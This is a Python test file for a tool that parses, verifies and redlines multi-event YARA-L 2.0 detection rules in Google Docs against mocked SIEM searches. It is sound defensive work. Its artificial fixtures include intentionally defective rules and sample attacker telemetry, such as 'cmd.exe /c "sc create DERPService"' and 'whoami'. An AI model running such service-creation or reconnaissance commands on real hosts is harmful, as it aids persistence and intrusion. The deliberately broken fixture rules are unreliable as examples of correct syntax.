    ft = FunctionTool(tools_module.verify_and_redline_yaral2_rules_in_doc)
    decl = ft._get_declaration()
    props = (decl.parameters_json_schema or {}).get("properties", {})
    assert "diagnose_zero_hit_retrohunt" in props
    assert "tool_context" not in props


def test_extract_yaral2_multi_event_spec_multiline_and_collapsed() -> None:
    """Verifies extraction of event_vars, per_event_udm_queries, join_bindings, match_clauses,
    and condition_tokens with exact 1-based UTF-16 spans on both multi-line and Drive-collapsed
    single-line multi-event YARA-L 2.0 rules."""
    from manager.tools.docs_review_tools import (
        _build_utf16_index_map,
        extract_yaral2_multi_event_spec,
    )

    multiline_rule = (
        "rule wins_d19_multi_stage {\n"
        "  meta:\n"
        '    author = "SecOps"\n'
        "  events:\n"
        '    $cmd.principal.hostname = "wins-d19"\n'
        "    re.regex($cmd.target.process.command_line, `.*cmd.*`) nocase\n"
        "    $cmd.principal.hostname = $host\n"
        "    re.regex($svc.target.process.command_line, `.*DERPService.*`) nocase\n"
        "    $svc.target.hostname = $host\n"
        "  match:\n"
        "    $host over 15m\n"
        "  condition:\n"
        "    $cmd and $svc\n"
        "}"
    )
    prefix = "Lead-in emoji \U0001f680 text:\n"
    full_text = prefix + multiline_rule
    idx_map = _build_utf16_index_map(full_text)

    spec = extract_yaral2_multi_event_spec(
        multiline_rule,
        rule_char_start=len(prefix),
        full_plain_text=full_text,
        index_map=idx_map,
    )
    assert spec["is_multi_event"] is True
    assert spec["event_vars"] == ["$cmd", "$svc"]
    assert spec["join_placeholders"] == ["$host"]
    assert spec["per_event_udm_queries"] == {
        "$cmd": 'principal.hostname = "wins-d19" AND target.process.command_line = /.*cmd.*/ nocase',
        "$svc": "target.process.command_line = /.*DERPService.*/ nocase",
    }
    assert len(spec["join_bindings"]) == 2
    jb0, jb1 = spec["join_bindings"]
    assert jb0["var_field_token"] == "$cmd.principal.hostname"
    assert jb0["semantic_type"] == "hostname"
    assert jb1["var_field_token"] == "$svc.target.hostname"
    assert jb1["semantic_type"] == "hostname"

    # Verify UTF-16 span of $svc.target.hostname in full_text
    expected_vf_pos = full_text.index("$svc.target.hostname")
    assert jb1["var_field_start_index"] == idx_map[expected_vf_pos]
    assert (
        jb1["var_field_end_index"]
        == idx_map[expected_vf_pos + len("$svc.target.hostname") - 1] + 1
    )

    assert len(spec["match_clauses"]) == 1
    mc = spec["match_clauses"][0]
    assert mc["placeholder_var"] == "$host"
    assert mc["window_raw"] == "over 15m"
    assert mc["window_valid"] is True
    assert mc["window_normalized"] == "over 15m"

    assert [ct["token_text"] for ct in spec["condition_tokens"]] == ["$cmd", "$svc"]
    assert spec["condition_span"]["condition_text"] == "$cmd and $svc"

    # Drive-collapsed single-line multi-event rule
    collapsed_rule = " ".join(
        line.strip() for line in multiline_rule.splitlines() if line.strip()
    )
    spec_collapsed = extract_yaral2_multi_event_spec(collapsed_rule)
    assert spec_collapsed["is_multi_event"] is True
    assert spec_collapsed["event_vars"] == ["$cmd", "$svc"]
    assert spec_collapsed["per_event_udm_queries"] == spec["per_event_udm_queries"]
    assert len(spec_collapsed["join_bindings"]) == 2
    assert spec_collapsed["match_clauses"][0]["window_valid"] is True
    assert [ct["token_text"] for ct in spec_collapsed["condition_tokens"]] == [
        "$cmd",
        "$svc",
    ]


def test_find_yaral2_rule_spans_detects_multi_event_join_match_and_condition_defects() -> None:
    """Verifies exact UTF-16 span detection and repaired_rule_text generation for
    match_placeholder_mismatch, invalid_match_window_syntax, cross_event_join_type_mismatch,
    and multi_event_condition_mismatch (both undeclared variable and omitted variable)."""
    from manager.tools.docs_review_tools import (
        _build_utf16_index_map,
        find_yaral2_rule_spans,
    )

    doc_text = (
        "rule gcp_iam_to_cloudsql_destructive_chain {\n"
        "  meta:\n"
        '    author = "SecOps Autonomous Agent"\n'
        "  strings:\n"
        '    $iam.log_type = "GCP_CLOUDAUDIT"\n'
        '    $iam.resource.name = "projects/base-production"\n'
        "    $iam.principal.ip = $ip\n"
        '    $sql.log_type = "GCP_CLOUDAUDIT"\n'
        "    $sql.principal.hostname = $ip\n"
        "  match:\n"
        "    $src_ip within 15 minutes\n"
        "  condition:\n"
        "    $iam and $sql_event\n"
        "}\n\n"
        "rule incomplete_multi_event_condition {\n"
        "  events:\n"
        '    $e1.metadata.event_type = "PROCESS_LAUNCH"\n'
        "    $e1.principal.ip = $actor_ip\n"
        '    $e2.metadata.event_type = "NETWORK_CONNECTION"\n'
        "    $e2.principal.ip = $actor_ip\n"
        "  match:\n"
        "    $actor_ip over 1 hour\n"
        "  condition:\n"
        "    $e1\n"
        "}\n"
    )
    idx_map = _build_utf16_index_map(doc_text)
    comments, edits, findings = find_yaral2_rule_spans(doc_text, idx_map)

    r1_findings = [
        f
        for f in findings
        if f["rule_name"] == "gcp_iam_to_cloudsql_destructive_chain"
    ]
    assert [f["defect_type"] for f in r1_findings] == [
        "yara_strings_section",
        "invalid_udm_field",
        "invalid_udm_field",
        "invalid_udm_field",
        "cross_event_join_type_mismatch",
        "match_placeholder_mismatch",
        "invalid_match_window_syntax",
        "multi_event_condition_mismatch",
    ]
    assert [
        (f["quote"], f["replacement"]) for f in r1_findings
    ] == [
        ("strings:", "events:"),
        ("$iam.log_type", "$iam.metadata.log_type"),
        ("$iam.resource.name", "$iam.target.resource.name"),
        ("$sql.log_type", "$sql.metadata.log_type"),
        ("$sql.principal.hostname", "$sql.principal.ip"),
        ("$src_ip", "$ip"),
        ("within 15 minutes", "over 15m"),
        ("$sql_event", "$sql"),
    ]

    repaired_r1 = r1_findings[0]["repaired_rule_text"]
    assert "events:" in repaired_r1
    assert "$sql.principal.ip = $ip" in repaired_r1
    assert "$ip over 15m" in repaired_r1
    assert "$iam and $sql" in repaired_r1
    assert r1_findings[0]["is_multi_event"] is True

    # Rule 2: incomplete condition ($e1 -> $e1 and $e2) + verbose match window (over 1 hour -> over 1h)
    r2_findings = [
        f
        for f in findings
        if f["rule_name"] == "incomplete_multi_event_condition"
    ]
    assert [(f["defect_type"], f["quote"], f["replacement"]) for f in r2_findings] == [
        ("invalid_match_window_syntax", "over 1 hour", "over 1h"),
        ("multi_event_condition_mismatch", "$e1", "$e1 and $e2"),
    ]
    assert "$e1 and $e2" in r2_findings[0]["repaired_rule_text"]
    assert "over 1h" in r2_findings[0]["repaired_rule_text"]

    # Ensure no two edit spans overlap across the entire document
    sorted_edits = sorted(edits, key=lambda e: e["start_index"])
    for prev_e, next_e in zip(sorted_edits, sorted_edits[1:]):
        assert prev_e["end_index"] <= next_e["start_index"]


def test_verify_yaral2_rule_with_siem_multi_event_per_stream_correlation() -> None:
    """Verifies that verify_yaral2_rule_with_siem executes separate search_udm calls per event
    variable ($iam, $sql), computes shared_join_values across streams, and reports
    correlated_event_count > 0 without falsely merging $iam and $sql into one impossible query."""
    from manager.tools.docs_review_tools import verify_yaral2_rule_with_siem

    rule_text = (
        "rule gcp_iam_to_cloudsql_destructive_chain {\n"
        "  meta:\n"
        '    author = "SecOps Autonomous Agent"\n'
        "  strings:\n"
        '    $iam.log_type = "GCP_CLOUDAUDIT"\n'
        '    $iam.resource.name = "projects/base-production"\n'
        "    $iam.principal.ip = $ip\n"
        '    $sql.log_type = "GCP_CLOUDAUDIT"\n'
        "    $sql.principal.hostname = $ip\n"
        "  match:\n"
        "    $src_ip within 15 minutes\n"
        "  condition:\n"
        "    $iam and $sql_event\n"
        "}"
    )

    queried_streams: list[str] = []

    def fake_validate(rule_text: str) -> str:
        assert "events:" in rule_text
        assert "$sql.principal.ip = $ip" in rule_text
        assert "$ip over 15m" in rule_text
        assert "$iam and $sql" in rule_text
        return "Rule validation PASSED."

    def fake_search(query: str, **kwargs: Any) -> dict[str, Any]:
        queried_streams.append(query)
        if 'target.resource.name = "projects/base-production"' in query:
            return {
                "events": [
                    {
                        "udm": {
                            "metadata": {"log_type": "GCP_CLOUDAUDIT"},
                            "principal": {"ip": ["104.198.226.161"]},
                            "target": {"resource": {"name": "projects/base-production"}},
                        }
                    }
                ],
                "total_events": 1,
            }
        if query == 'metadata.log_type = "GCP_CLOUDAUDIT"':
            return {
                "events": [
                    {
                        "udm": {
                            "metadata": {"log_type": "GCP_CLOUDAUDIT"},
                            "principal": {"ip": ["104.198.226.161"]},
                        }
                    }
                    for _ in range(9)
                ],
                "total_events": 9,
            }
        return {"events": [], "total_events": 0}

    res = verify_yaral2_rule_with_siem(
        rule_text,
        run_retrohunt_check=True,
        siem_validate_fn=fake_validate,
        siem_search_fn=fake_search,
    )
    assert res["status"] == "success"
    assert res["is_multi_event"] is True
    assert res["compiler_verified"] is True
    assert res["retrohunt_verified"] is True
    assert res["retrohunt_event_count"] == 10
    assert len(queried_streams) == 2
    me_retro = res["multi_event_retrohunt"]
    assert me_retro["per_event_counts"] == {"$iam": 1, "$sql": 9}
    assert me_retro["shared_join_values"] == ["104.198.226.161"]
    assert me_retro["correlated_event_count"] == 10


def test_diagnose_zero_hit_yaral2_rule_multi_event_join_entity_role_swap() -> None:
    """Verifies that when $cmd and $svc both match events individually in Chronicle SIEM
    but have 0 shared join values because $svc used $svc.target.hostname = $host instead of
    $svc.principal.hostname = $host, diagnose_zero_hit_yaral2_rule pivots $svc's join binding
    to $svc.principal.hostname, compiles the pivoted rule, and computes correlated_event_count."""
    from manager.tools.docs_review_tools import diagnose_zero_hit_yaral2_rule

    rule_text = (
        "rule wins_d19_lolbin_to_derpservice_correlation {\n"
        "  meta:\n"
        '    author = "SecOps Autonomous Agent"\n'
        "  events:\n"
        '    $cmd.principal.hostname = "wins-d19"\n'
        "    re.regex($cmd.target.process.command_line, `.*cmd.*`) nocase\n"
        "    $cmd.principal.hostname = $host\n"
        "    re.regex($svc.target.process.command_line, `.*DERPService.*`) nocase\n"
        "    $svc.target.hostname = $host\n"
        "  match:\n"
        "    $host over 15m\n"
        "  condition:\n"
        "    $cmd and $svc\n"
        "}"
    )

    validated_rules: list[str] = []

    def fake_validate(rule_text: str) -> str:
        validated_rules.append(rule_text)
        return "Rule validation PASSED."

    def fake_search(query: str, **kwargs: Any) -> dict[str, Any]:
        if "DERPService" in query:
            return {
                "events": [
                    {
                        "udm": {
                            "principal": {"hostname": "wins-d19"},
                            "target": {
                                "process": {
                                    "command_line": "C:\\Users\\Administrator\\DERPService.exe"
                                }
                            },
                        }
                    }
                ],
                "total_events": 1,
            }
        if 'principal.hostname = "wins-d19"' in query:
            return {
                "events": [
                    {
                        "udm": {
                            "principal": {"hostname": "wins-d19"},
                            "target": {
                                "process": {
                                    "command_line": 'C:\\Windows\\system32\\cmd.exe /c "sc create DERPService"'
                                }
                            },
                        }
                    }
                    for _ in range(10)
                ],
                "total_events": 10,
            }
        return {"events": [], "total_events": 0}

    diag = diagnose_zero_hit_yaral2_rule(
        rule_text,
        siem_validate_fn=fake_validate,
        siem_search_fn=fake_search,
    )
    assert diag["status"] == "success"
    assert diag["is_multi_event"] is True
    assert diag["zero_hit"] is True
    assert diag["diagnosis_class"] == "cross_event_join_entity_role_swap"
    assert diag["recommended_field"] == "principal.hostname"
    assert diag["recommended_span_target"] == "var_field"
    assert diag["recommended_span_replacement"] == "$svc.principal.hostname"
    assert diag["recommended_yaral2_predicate"] == "$svc.principal.hostname = $host"
    assert "$svc.principal.hostname = $host" in diag["pivoted_rule_text"]
    assert "$svc.target.hostname" not in diag["pivoted_rule_text"]
    assert diag["pivot_verified"] is True
    assert diag["pivot_compiler_verified"] is True
    assert diag["pivot_event_count"] == 11
    assert diag["shared_join_values"] == ["wins-d19"]
    assert any("$svc.principal.hostname = $host" in r for r in validated_rules)


def test_verify_and_redline_yaral2_rules_in_doc_multi_event_end_to_end_and_idempotency() -> None:
    """Verifies end-to-end Google Docs API v1 batchUpdate ordering (comments first,
    descending-index writeMode="SUGGEST" replacements second) across static multi-event defects,
    zero-hit cross_event_join_entity_role_swap diagnosis, valid multi-event control preservation,
    and Pass 2 idempotency."""
    from manager.tools.docs_review_tools import (
        clear_doc_index_cache,
        verify_and_redline_yaral2_rules_in_doc,
    )

    clear_doc_index_cache()

    doc_text = (
        "# Multi-Event YARA-L 2.0 Detection Rules\n\n"
        "rule gcp_iam_to_cloudsql_destructive_chain {\n"
        "  meta:\n"
        '    author = "SecOps Autonomous Agent"\n'
        "  strings:\n"
        '    $iam.log_type = "GCP_CLOUDAUDIT"\n'
        '    $iam.resource.name = "projects/base-production"\n'
        "    $iam.principal.ip = $ip\n"
        '    $sql.log_type = "GCP_CLOUDAUDIT"\n'
        "    $sql.principal.hostname = $ip\n"
        "  match:\n"
        "    $src_ip within 15 minutes\n"
        "  condition:\n"
        "    $iam and $sql_event\n"
        "}\n\n"
        "rule wins_d19_lolbin_to_derpservice_correlation {\n"
        "  meta:\n"
        '    author = "SecOps Autonomous Agent"\n'
        "  events:\n"
        '    $cmd.principal.hostname = "wins-d19"\n'
        "    re.regex($cmd.target.process.command_line, `.*cmd.*`) nocase\n"
        "    $cmd.principal.hostname = $host\n"
        "    re.regex($svc.target.process.command_line, `.*DERPService.*`) nocase\n"
        "    $svc.target.hostname = $host\n"
        "  match:\n"
        "    $host over 15m\n"
        "  condition:\n"
        "    $cmd and $svc\n"
        "}\n\n"
        "rule wins_d19_verified_multi_event_baseline {\n"
        "  meta:\n"
        '    author = "SecOps Autonomous Agent"\n'
        "  events:\n"
        '    $e1.principal.hostname = "wins-d19"\n'
        "    re.regex($e1.target.process.command_line, `.*cmd.*`) nocase\n"
        "    $e1.principal.hostname = $host\n"
        "    re.regex($e2.target.process.command_line, `.*DERPService.*`) nocase\n"
        "    $e2.principal.hostname = $host\n"
        "  match:\n"
        "    $host over 15m\n"
        "  condition:\n"
        "    $e1 and $e2\n"
        "}\n"
    )

    mock_doc = {
        "documentId": "doc-multi-event-yl2",
        "title": "Multi-Event YARA-L 2.0 Correlation Test",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": len(doc_text) + 1,
                                "textRun": {"content": doc_text},
                            }
                        ]
                    }
                }
            ]
        },
    }
    batch_calls: list[dict[str, Any]] = []

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=mock_doc)
        payload = json.loads(request.content.decode("utf-8"))
        batch_calls.append(payload)
        if any("insertComment" in r for r in payload.get("requests", [])):
            return httpx.Response(
                200,
                json={
                    "replies": [
                        {"insertComment": {"commentId": f"c-me-{i}"}}
                        for i, _ in enumerate(payload["requests"])
                    ]
                },
            )
        return httpx.Response(
            200,
            json={"replies": [{} for _ in payload.get("requests", [])]},
        )

    def fake_validate(rule_text: str) -> str:
        return "Rule validation PASSED."

    def fake_search(query: str, **kwargs: Any) -> dict[str, Any]:
        if "GCP_CLOUDAUDIT" in query:
            return {
                "events": [
                    {
                        "udm": {
                            "metadata": {"log_type": "GCP_CLOUDAUDIT"},
                            "principal": {"ip": ["104.198.226.161"]},
                            "target": {"resource": {"name": "projects/base-production"}},
                        }
                    }
                    for _ in range(5)
                ],
                "total_events": 5,
            }
        if "DERPService" in query:
            return {
                "events": [
                    {
                        "udm": {
                            "principal": {"hostname": "wins-d19"},
                            "target": {
                                "process": {
                                    "command_line": "C:\\Users\\Administrator\\DERPService.exe"
                                }
                            },
                        }
                    }
                ],
                "total_events": 1,
            }
        if 'principal.hostname = "wins-d19"' in query:
            return {
                "events": [
                    {
                        "udm": {
                            "principal": {"hostname": "wins-d19"},
                            "target": {
                                "process": {
                                    "command_line": "C:\\Windows\\system32\\cmd.exe /c whoami"
                                }
                            },
                        }
                    }
                    for _ in range(10)
                ],
                "total_events": 10,
            }
        return {"events": [], "total_events": 0}

    res = verify_and_redline_yaral2_rules_in_doc(
        "doc-multi-event-yl2",
        run_live_siem_check=True,
        diagnose_zero_hit_retrohunt=True,
        siem_validate_fn=fake_validate,
        siem_search_fn=fake_search,
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(handler),
    )
    assert res["status"] == "success"
    # 8 static findings on Rule 1 + 1 zero-hit join swap on Rule 2 + 0 on Rule 3 = 9
    assert res["yaral2_findings_count"] == 9
    assert res["zero_hit_yaral2_findings_count"] == 1
    assert res["skipped_existing_suggestion_count"] == 0
    assert res["comments"]["inserted_count"] == 9
    assert res["edits"]["applied_count"] == 9

    rule_names_with_findings = {f["rule_name"] for f in res["findings"]}
    assert "wins_d19_verified_multi_event_baseline" not in rule_names_with_findings

    zh_findings = [f for f in res["findings"] if f.get("zero_hit_diagnosis")]
    assert len(zh_findings) == 1
    assert zh_findings[0]["zero_hit_diagnosis"] == "cross_event_join_entity_role_swap"
    assert zh_findings[0]["quote"] == "$svc.target.hostname"
    assert zh_findings[0]["replacement"] == "$svc.principal.hostname"
    assert zh_findings[0]["shared_join_values"] == ["wins-d19"]

    assert len(batch_calls) == 2
    assert "writeControl" not in batch_calls[0]
    assert batch_calls[1]["writeControl"] == {"writeMode": "SUGGEST"}
    delete_starts = [
        req["deleteContentRange"]["range"]["startIndex"]
        for req in batch_calls[1]["requests"]
        if "deleteContentRange" in req
    ]
    assert delete_starts == sorted(delete_starts, reverse=True)

    # Pass 2 idempotency with pending suggestions covering the document -> 0 new edits, 9 skipped
    mock_doc_pending = {
        "documentId": "doc-multi-event-yl2",
        "title": "Multi-Event YARA-L 2.0 Correlation Test",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": len(doc_text) + 1,
                                "textRun": {
                                    "content": doc_text,
                                    "suggestedDeletionIds": [
                                        "suggest.yl2.me.existing"
                                    ],
                                },
                            }
                        ]
                    }
                }
            ]
        },
    }
    batch_calls.clear()
    res2 = verify_and_redline_yaral2_rules_in_doc(
        "doc-multi-event-yl2",
        run_live_siem_check=True,
        diagnose_zero_hit_retrohunt=True,
        siem_validate_fn=fake_validate,
        siem_search_fn=fake_search,
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(
            lambda req: httpx.Response(200, json=mock_doc_pending)
        ),
    )
    assert res2["status"] == "success"
    assert res2["yaral2_findings_count"] == 0
    assert res2["zero_hit_yaral2_findings_count"] == 0
    assert res2["skipped_existing_suggestion_count"] == 9
    assert res2["comments"]["inserted_count"] == 0
    assert res2["edits"]["applied_count"] == 0
    assert len(batch_calls) == 0


